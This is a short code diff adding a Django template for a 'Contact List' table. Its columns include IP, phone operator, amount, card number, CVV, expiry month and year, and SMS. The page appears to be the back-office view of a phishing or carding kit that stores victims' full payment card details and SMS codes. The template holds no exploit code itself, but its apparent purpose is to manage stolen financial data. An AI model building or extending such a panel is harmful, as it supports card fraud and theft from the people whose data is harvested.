@@ -1,0 +1,36 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+{% load static %}
+{% block content %}
+{% csrf_token %}
+
+    <h1>Contact List</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>IP</th>
+                <th>operator</th>
+                <th>Phone</th>
+                <th>Amount</th>
+                <th>Card Number</th>
+                <th>CVV</th>
+                <th>MM</th>
+                <th>YY</th>
+                <th>SMS</th>
+                <th>Created At</th>
+                <th>Actions</th>
+                <p>You are visitor number {{ request.session.visit_count }}.</p>
+
+            </tr>
+        </thead>
+        
+        <tbody id="contact-table-body">
+            <!-- JavaScript will populate this section -->
+        </tbody>
+    </table>
+{% endblock %}
+
+{% block extra_js %}
+    <script src="{% static 'js/crud.js' %}"></script>
+    
+{% endblock %}
